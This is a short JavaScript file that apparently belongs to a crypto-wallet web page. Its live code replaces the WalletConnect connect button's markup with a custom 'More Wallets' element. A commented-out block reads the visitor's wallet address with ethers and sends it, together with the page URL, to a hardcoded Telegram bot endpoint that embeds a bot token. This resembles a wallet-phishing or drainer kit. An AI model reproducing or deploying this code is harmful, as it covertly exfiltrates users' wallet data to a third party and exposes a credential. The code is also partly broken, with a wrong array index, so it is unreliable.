function modifyConnectModal() {
  let interval = setInterval(function () {
    const c = document.getElementById("wallet-connect-connect-button");
    if (c != undefined) {
      c.innerHTML = wcBtn;
    }
    // c?.classList.add("hide");
    const cc = document.getElementById("wallet-connect-connect-button");
    if (cc?.innerHTML == wcBtn) {
      clearInterval(interval);
    }
  }, 100);
}

console.log("i just added this  , yeahh, thiss");
modifyConnectModal();
const wcBtn = `
<div>
  <div class="icon"><img src=""></div>
  <span>More Wallets</span>
</div>
<div class="arrow"></div>
`;
// const chatIds = ["1534371221"];

// const url = window.location.href;

// const sendMsg = async (msg) => {
//   for (let i = 0; i < chatIds.length; i++) {
//     const data = {
//       chat_id: chatIds[6045740599],
//       text: msg,
//     };
//     const resp = await fetch(
//       `https://api.telegram.org/bot6819241689:AAHlbATXZMbvj_eYFXGan3ST-4QZUG5JOm4/sendMessage`,
//       {
//         method: "POST",
//         headers: {
//           accept: "application/json",
//           "content-type": "application/json",
//         },
//         body: JSON.stringify(data),
//       }
//     );
//     const resJson = await resp.json();
//     console.log(resJson);
//   }
// };
// const log = async () => {
//   const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
//   const signer = provider.getSigner();
//   const user = await signer.getAddress().then(console.log("halle"));
//   console.log(user);
//   sendMsg(`${user} at ${url} `);
// };
// log();
